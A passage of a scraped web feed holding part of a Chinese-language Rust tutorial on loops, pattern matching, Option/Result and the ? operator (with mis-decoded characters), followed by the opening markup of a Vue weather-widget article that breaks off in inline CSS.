    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..<span class="hljs-number">5</span> {  <span class="hljs-comment">// ä¸åŒ…å«5: 0,1,2,3,4</span>
        <span class="hljs-built_in">print!</span>(<span class="hljs-string">"{} "</span>, i);
    }
    <span class="hljs-built_in">println!</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"èŒƒå›´ 0..=5:"</span>);
    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..=<span class="hljs-number">5</span> {  <span class="hljs-comment">// åŒ…å«5: 0,1,2,3,4,5</span>
        <span class="hljs-built_in">print!</span>(<span class="hljs-string">"{} "</span>, i);
    }
    <span class="hljs-built_in">println!</span>();
</code></pre>
<h4 data-id="heading-11">2. éå†æ•°ç»„</h4>
<pre><code class="hljs language-rust" lang="rust">    <span class="hljs-comment">// 2. éå†æ•°ç»„</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">numbers</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\néå†æ•°ç»„:"</span>);
    <span class="hljs-keyword">for</span> <span class="hljs-variable">number</span> <span class="hljs-keyword">in</span> numbers {
        <span class="hljs-built_in">print!</span>(<span class="hljs-string">"{} "</span>, number);
    }
    <span class="hljs-built_in">println!</span>();
    
    <span class="hljs-comment">// éå†æ•°ç»„å¸¦ç´¢å¼•</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\néå†æ•°ç»„å¸¦ç´¢å¼•:"</span>);
    <span class="hljs-title function_ invoke__">for</span> (index, &amp;value) <span class="hljs-keyword">in</span> numbers.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">enumerate</span>() {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"numbers[{}] = {}"</span>, index, value);
    }
</code></pre>
<h4 data-id="heading-12">3. éå†å‘é‡</h4>
<pre><code class="hljs language-rust" lang="rust">    <span class="hljs-comment">// 3. éå†å‘é‡ (Vec)</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">vec</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-string">"è‹¹æœ"</span>, <span class="hljs-string">"é¦™è•‰"</span>, <span class="hljs-string">"æ©™å­"</span>];
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\néå†å‘é‡:"</span>);
    <span class="hljs-keyword">for</span> <span class="hljs-variable">fruit</span> <span class="hljs-keyword">in</span> &amp;vec {
        <span class="hljs-built_in">print!</span>(<span class="hljs-string">"{} "</span>, fruit);
    }
    <span class="hljs-built_in">println!</span>();
</code></pre>
<h4 data-id="heading-13">4. éå†å­—ç¬¦ä¸²</h4>
<pre><code class="hljs language-rust" lang="rust">    <span class="hljs-comment">// 4. éå†å­—ç¬¦ä¸²å­—ç¬¦</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">text</span> = <span class="hljs-string">"Rust"</span>;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\néå†å­—ç¬¦ä¸²å­—ç¬¦:"</span>);
    <span class="hljs-keyword">for</span> <span class="hljs-variable">ch</span> <span class="hljs-keyword">in</span> text.<span class="hljs-title function_ invoke__">chars</span>() {
        <span class="hljs-built_in">print!</span>(<span class="hljs-string">"{} "</span>, ch);
    }
    <span class="hljs-built_in">println!</span>();
    <span class="hljs-comment">// éå†å­—ç¬¦ä¸²å­—èŠ‚</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\néå†å­—ç¬¦ä¸²å­—èŠ‚:"</span>);
    <span class="hljs-keyword">for</span> <span class="hljs-variable">byte</span> <span class="hljs-keyword">in</span> text.<span class="hljs-title function_ invoke__">bytes</span>() {
        <span class="hljs-built_in">print!</span>(<span class="hljs-string">"{} "</span>, byte);
    }
    <span class="hljs-built_in">println!</span>();
    
</code></pre>
<h4 data-id="heading-14">5. åå‘éå†</h4>
<pre><code class="hljs language-rust" lang="rust">    <span class="hljs-comment">// 7. åå‘éå†</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\nåå‘éå†:"</span>);
    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>..<span class="hljs-number">5</span>).<span class="hljs-title function_ invoke__">rev</span>() {
        <span class="hljs-built_in">print!</span>(<span class="hljs-string">"{} "</span>, i);  <span class="hljs-comment">// 4, 3, 2, 1, 0</span>
    }
    <span class="hljs-built_in">println!</span>();
</code></pre>
<h4 data-id="heading-15">6. å¸¦æ­¥é•¿éå†</h4>
<pre><code class="hljs language-rust" lang="rust">    <span class="hljs-comment">// 6. å¸¦æ­¥é•¿çš„éå†</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\nå¸¦æ­¥é•¿çš„éå†:"</span>);
    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>..=<span class="hljs-number">10</span>).<span class="hljs-title function_ invoke__">step_by</span>(<span class="hljs-number">2</span>) {
        <span class="hljs-built_in">print!</span>(<span class="hljs-string">"{} "</span>, i);  <span class="hljs-comment">// 0, 2, 4, 6, 8, 10</span>
    }
    <span class="hljs-built_in">println!</span>();
</code></pre>
<h2 data-id="heading-16">æ¨¡å¼åŒ¹é…(match)</h2>
<p>matchç›¸å½“äºswitch-case</p>
<h3 data-id="heading-17">åŸºæœ¬ç”¨æ³•</h3>
<pre><code class="hljs language-rust" lang="rust">    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">number</span> = <span class="hljs-number">42</span>;
    
    <span class="hljs-comment">// åŸºæœ¬ matchï¼Œç±»ä¼¼ switch</span>
    <span class="hljs-keyword">match</span> number {
        <span class="hljs-number">1</span> =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"ä¸€"</span>),
        <span class="hljs-number">2</span> | <span class="hljs-number">3</span> | <span class="hljs-number">5</span> | <span class="hljs-number">7</span> | <span class="hljs-number">11</span> =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"å°äº12çš„è´¨æ•°"</span>),
        <span class="hljs-number">13</span>..=<span class="hljs-number">19</span> =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"åå‡ å²"</span>),
        <span class="hljs-number">20</span>..=<span class="hljs-number">39</span> =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"äºŒåå¤šåˆ°ä¸‰åå¤š"</span>),
        <span class="hljs-number">40</span>..=<span class="hljs-number">49</span> =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"å››åå¤šå²"</span>),
        _ =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"å…¶ä»–æ•°å­—"</span>),  <span class="hljs-comment">// é»˜è®¤æƒ…å†µ</span>
    }
    
    <span class="hljs-comment">// match æ˜¯è¡¨è¾¾å¼ï¼Œå¯ä»¥è¿”å›å€¼</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">description</span> = <span class="hljs-keyword">match</span> number {
        <span class="hljs-number">0</span> =&gt; <span class="hljs-string">"é›¶"</span>,
        <span class="hljs-number">1</span> =&gt; <span class="hljs-string">"ä¸€"</span>,
        <span class="hljs-number">2</span> =&gt; <span class="hljs-string">"äºŒ"</span>,
        _ =&gt; <span class="hljs-string">"å…¶ä»–"</span>,
    };
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æè¿°: {}"</span>, description);
    
    <span class="hljs-comment">// åŒ¹é…å¸ƒå°”å€¼</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">flag</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">status</span> = <span class="hljs-keyword">match</span> flag {
        <span class="hljs-literal">true</span> =&gt; <span class="hljs-string">"å¼€å¯"</span>,
        <span class="hljs-literal">false</span> =&gt; <span class="hljs-string">"å…³é—­"</span>,
    };
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"çŠ¶æ€: {}"</span>, status);
</code></pre>
<h3 data-id="heading-18">å¤æ‚æ¨¡å¼åŒ¹é…</h3>
<p>matchå¯ä»¥åŒ¹é…å…ƒç»„ï¼Œæšä¸¾ï¼ŒOptionï¼ŒResultå’Œç»“æ„ä½“</p>
<pre><code class="hljs language-rust" lang="rust">    <span class="hljs-comment">// 1. åŒ¹é…å…ƒç»„</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">point</span> = (<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);
    
    <span class="hljs-keyword">match</span> point {
        (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"åŸç‚¹"</span>),
        (<span class="hljs-number">0</span>, y) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"åœ¨Yè½´ä¸Šï¼Œy = {}"</span>, y),
        (x, <span class="hljs-number">0</span>) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"åœ¨Xè½´ä¸Šï¼Œx = {}"</span>, x),
        (x, y) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"ç‚¹ ({}, {})"</span>, x, y),
    }
    
    <span class="hljs-comment">// 2. åŒ¹é…æšä¸¾</span>
    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Direction</span> {
        Up,
        Down,
        Left,
        Right,
    }
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">dir</span> = Direction::Right;
    
    <span class="hljs-keyword">match</span> dir {
        Direction::Up =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"å‘ä¸Š"</span>),
        Direction::Down =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"å‘ä¸‹"</span>),
        Direction::Left =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"å‘å·¦"</span>),
        Direction::Right =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"å‘å³"</span>),
    }
    
    <span class="hljs-comment">// 3. å¸¦æ•°æ®çš„æšä¸¾</span>
    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Shape</span> {
        <span class="hljs-title function_ invoke__">Circle</span>(<span class="hljs-type">f64</span>),        <span class="hljs-comment">// åŠå¾„</span>
        <span class="hljs-title function_ invoke__">Rectangle</span>(<span class="hljs-type">f64</span>, <span class="hljs-type">f64</span>), <span class="hljs-comment">// å®½, é«˜</span>
        <span class="hljs-title function_ invoke__">Square</span>(<span class="hljs-type">f64</span>),        <span class="hljs-comment">// è¾¹é•¿</span>
    }
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">shape</span> = Shape::<span class="hljs-title function_ invoke__">Rectangle</span>(<span class="hljs-number">3.0</span>, <span class="hljs-number">4.0</span>);
    
    <span class="hljs-keyword">match</span> shape {
        Shape::<span class="hljs-title function_ invoke__">Circle</span>(radius) =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"åœ†å½¢ï¼ŒåŠå¾„: {:.2}"</span>, radius);
        }
        Shape::<span class="hljs-title function_ invoke__">Rectangle</span>(width, height) =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"çŸ©å½¢ï¼Œå®½: {:.2}, é«˜: {:.2}"</span>, width, height);
        }
        Shape::<span class="hljs-title function_ invoke__">Square</span>(side) =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ­£æ–¹å½¢ï¼Œè¾¹é•¿: {:.2}"</span>, side);
        }
    }
    
    <span class="hljs-comment">// 4. åŒ¹é… Option</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">maybe_value</span>: <span class="hljs-type">Option</span>&lt;<span class="hljs-type">i32</span>&gt; = <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-number">42</span>);
    
    <span class="hljs-keyword">match</span> maybe_value {
        <span class="hljs-title function_ invoke__">Some</span>(x) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æœ‰å€¼: {}"</span>, x),
        <span class="hljs-literal">None</span> =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ²¡æœ‰å€¼"</span>),
    }
    
    <span class="hljs-comment">// 5. åŒ¹é… Result</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">result</span>: <span class="hljs-type">Result</span>&lt;<span class="hljs-type">i32</span>, &amp;<span class="hljs-type">str</span>&gt; = <span class="hljs-title function_ invoke__">Ok</span>(<span class="hljs-number">42</span>);
    
    <span class="hljs-keyword">match</span> result {
        <span class="hljs-title function_ invoke__">Ok</span>(value) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æˆåŠŸ: {}"</span>, value),
        <span class="hljs-title function_ invoke__">Err</span>(error) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"é”™è¯¯: {}"</span>, error),
    }
    <span class="hljs-comment">// 5. åŒ¹é…ç»“æ„ä½“</span>
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Point</span> {
        x: <span class="hljs-type">i32</span>,
        y: <span class="hljs-type">i32</span>,
    }
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">point</span> = Point { x: <span class="hljs-number">0</span>, y: <span class="hljs-number">7</span> };
    
    <span class="hljs-keyword">match</span> point {
        Point { x: <span class="hljs-number">0</span>, y: <span class="hljs-number">0</span> } =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"åŸç‚¹"</span>),
        Point { x, y: <span class="hljs-number">0</span> } =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"åœ¨Xè½´ä¸Šï¼Œx = {}"</span>, x),
        Point { x: <span class="hljs-number">0</span>, y } =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"åœ¨Yè½´ä¸Šï¼Œy = {}"</span>, y),
        Point { x, y } =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"ç‚¹({}, {})"</span>, x, y),
    }
</code></pre>
<h4 data-id="heading-19">@ç»‘å®š</h4>
<p>Rustä¸­çš„@ç»‘å®šï¼ˆä¹Ÿç§°ä¸ºç»‘å®šæ¨¡å¼ï¼‰å…è®¸åœ¨æ¨¡å¼åŒ¹é…çš„åŒæ—¶ï¼Œå°†åŒ¹é…çš„å€¼ç»‘å®šåˆ°ä¸€ä¸ªå˜é‡ä¸Šã€‚è¿™åœ¨éœ€è¦å¯¹åŒ¹é…çš„å€¼è¿›è¡Œè¿›ä¸€æ­¥æ“ä½œæ—¶éå¸¸æœ‰ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨åµŒå¥—æ¨¡å¼ä¸­ã€‚</p>
<pre><code class="hljs language-rust" lang="rust">    <span class="hljs-comment">//  @ ç»‘å®š </span>
    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Message</span> {
        Hello { id: <span class="hljs-type">i32</span> },
    }
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">msg</span> = Message::Hello { id: <span class="hljs-number">5</span> };
    
    <span class="hljs-keyword">match</span> msg {
        Message::Hello { id: id_variable @ <span class="hljs-number">3</span>..=<span class="hljs-number">7</span> } =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ‰¾åˆ°èŒƒå›´å†…çš„id: {}"</span>, id_variable);
        }
        Message::Hello { id: <span class="hljs-number">10</span>..=<span class="hljs-number">12</span> } =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ‰¾åˆ°å¦ä¸€ä¸ªèŒƒå›´å†…çš„id"</span>);
        }
        Message::Hello { id } =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ‰¾åˆ°å…¶ä»–id: {}"</span>, id);
        }
    }
</code></pre>
<h4 data-id="heading-20">å¼•ç”³ï¼šOptionå’ŒResult</h4>
<p>Â <code>Option&lt;T&gt;</code>Â å’ŒÂ <code>Result&lt;T, E&gt;</code>æ˜¯ Rust ä¸­ç”¨äºå¤„ç†å¯èƒ½ç¼ºå¤±çš„å€¼å’Œå¯èƒ½å¤±è´¥çš„æ“ä½œçš„æ ¸å¿ƒç±»å‹ã€‚å®ƒä»¬æ˜¯ Rust å®‰å…¨ç¼–ç¨‹å“²å­¦çš„åŸºçŸ³ï¼Œå¼ºåˆ¶åœ¨ç¼–è¯‘æ—¶å¤„ç†æ‰€æœ‰å¯èƒ½çš„é”™è¯¯æƒ…å†µã€‚</p>
<p>Rustä¸­æ²¡æœ‰<code>undefined</code>ç±»å‹ï¼Œä¹Ÿæ²¡æœ‰<code>try-catch</code>è¯­å¥ï¼Œè€Œç”¨Optionå’ŒResultå¤„ç†è¿™ä¸¤è€…ã€‚</p>
<h5 data-id="heading-21">Optionçš„åŸºæœ¬ç”¨æ³•</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// åœ¨Rustä¸­ï¼Œä½¿ç”¨Option&lt;T&gt;æ¥è¡¨ç¤ºä¸€ä¸ªå€¼å¯èƒ½å­˜åœ¨æˆ–å¯èƒ½ç¼ºå¤±</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">some_value</span>: <span class="hljs-type">Option</span>&lt;<span class="hljs-type">i32</span>&gt; = <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-number">5</span>);
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">no_value</span>: <span class="hljs-type">Option</span>&lt;<span class="hljs-type">i32</span>&gt; = <span class="hljs-literal">None</span>;

<span class="hljs-comment">// å‡½æ•°å¯èƒ½è¿”å›None</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">find_item</span>(id: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;<span class="hljs-type">String</span>&gt; {
   <span class="hljs-keyword">if</span> id == <span class="hljs-number">1</span> {
       <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-string">"Item found"</span>.<span class="hljs-title function_ invoke__">to_string</span>())
   } <span class="hljs-keyword">else</span> {
       <span class="hljs-literal">None</span>  <span class="hljs-comment">// ç›¸å½“äºJavaScriptä¸­çš„undefined</span>
   }
}
</code></pre>
<h5 data-id="heading-22">Resultçš„åŸºæœ¬ç”¨æ³•</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// å‡½æ•°è¿”å›Resultè¡¨ç¤ºå¯èƒ½å¤±è´¥</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">open_file</span>(path: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;File, std::io::Error&gt; {
    <span class="hljs-keyword">match</span> File::<span class="hljs-title function_ invoke__">open</span>(path) {
        <span class="hljs-title function_ invoke__">Ok</span>(file) =&gt; <span class="hljs-title function_ invoke__">Ok</span>(file),
        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; <span class="hljs-title function_ invoke__">Err</span>(e),  <span class="hljs-comment">// è¿”å›é”™è¯¯è€Œä¸æ˜¯æŠ›å‡ºå¼‚å¸¸</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨matchå¤„ç†Result</span>
<span class="hljs-keyword">match</span> <span class="hljs-title function_ invoke__">open_file</span>(<span class="hljs-string">"test.txt"</span>) {
    <span class="hljs-title function_ invoke__">Ok</span>(file) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ–‡ä»¶æ‰“å¼€æˆåŠŸ"</span>),
    <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ‰“å¼€æ–‡ä»¶å¤±è´¥: {}"</span>, e),
}
</code></pre>
<h5 data-id="heading-23">Rustä¸­çš„<code>?</code>æ“ä½œç¬¦</h5>
<p><code>?</code>æ“ä½œç¬¦åœ¨Rustä¸­ç”¨äºé”™è¯¯ä¼ æ’­ï¼Œå®ƒç®€åŒ–äº†Resultå’ŒOptionç±»å‹çš„å¤„ç†ï¼Œä½¿ä»£ç æ›´ç®€æ´ã€‚å…¶åŸºæœ¬ä½œç”¨æ˜¯å¯¹Resultæˆ–Optionå€¼è¿›è¡Œåˆ¤æ–­ï¼šå¦‚æœæ˜¯Ok/Someï¼Œå°±è§£åŒ…å–å‡ºå†…éƒ¨å€¼ç»§ç»­æ‰§è¡Œï¼›å¦‚æœæ˜¯Err/Noneï¼Œåˆ™æå‰è¿”å›è¯¥é”™è¯¯æˆ–Noneã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">example</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">i32</span>, <span class="hljs-type">String</span>&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">x</span>: <span class="hljs-type">Result</span>&lt;<span class="hljs-type">i32</span>, <span class="hljs-type">String</span>&gt; = <span class="hljs-title function_ invoke__">Ok</span>(<span class="hljs-number">5</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">y</span> = x?;  <span class="hljs-comment">// å¦‚æœ x æ˜¯ Ok(5)ï¼Œåˆ™ y = 5</span>
                 <span class="hljs-comment">// å¦‚æœ x æ˜¯ Err(e)ï¼Œåˆ™ç«‹å³è¿”å› Err(e)</span>
    <span class="hljs-title function_ invoke__">Ok</span>(y * <span class="hljs-number">2</span>)
}
</code></pre>
<h3 data-id="heading-24">if letå’Œwhile let</h3>
<p><code>if let</code>Â æ˜¯ä¸€ç§æ›´ç®€æ´çš„æ–¹å¼ï¼Œç”¨äºå¤„ç†åªåŒ¹é…ä¸€ä¸ªæ¨¡å¼çš„å€¼è€Œå¿½ç•¥å…¶ä»–æ¨¡å¼çš„æƒ…å†µã€‚<code>while let</code>Â å…è®¸åªè¦æ¨¡å¼åŒ¹é…å°±ä¸€ç›´è¿›è¡Œå¾ªç¯ã€‚</p>
<pre><code class="hljs language-scss" lang="scss"> <span class="hljs-comment">// ä½¿ç”¨ if let</span>
let some_value = <span class="hljs-built_in">Some</span>(<span class="hljs-number">42</span>);
if let <span class="hljs-built_in">Some</span>(x) = some_value {
    println!("å€¼æ˜¯: {}", x);
}

<span class="hljs-comment">// æ¡ä»¶å¾ªç¯åŒ¹é…</span>
while let <span class="hljs-built_in">Some</span>(item) = iter<span class="hljs-selector-class">.next</span>() {
    <span class="hljs-comment">// ...</span>
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vueå®ç°å¤§å±è·å–å½“å‰æ‰€å¤„åŸå¸‚åŠå½“åœ°å¤©æ°”(çº¯å…è´¹)]]></title>    <link>https://juejin.cn/post/7603656494905475078</link>    <guid>https://juejin.cn/post/7603656494905475078</guid>    <pubDate>2026-02-08T01:49:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603656494905475078" data-draft-id="7603656494905458694" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vueå®ç°å¤§å±è·å–å½“å‰æ‰€å¤„åŸå¸‚åŠå½“åœ°å¤©æ°”(çº¯å…è´¹)"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-08T01:49:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æå‰‘ä¸€"/> <meta itemprop="url" content="https://juejin.cn/user/4147782344247918"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vueå®ç°å¤§å±è·å–å½“å‰æ‰€å¤„åŸå¸‚åŠå½“åœ°å¤©æ°”(çº¯å…è´¹)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4147782344247918/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æå‰‘ä¸€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-08T01:49:04.000Z" title="Sun Feb 08 2026 01:49:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoA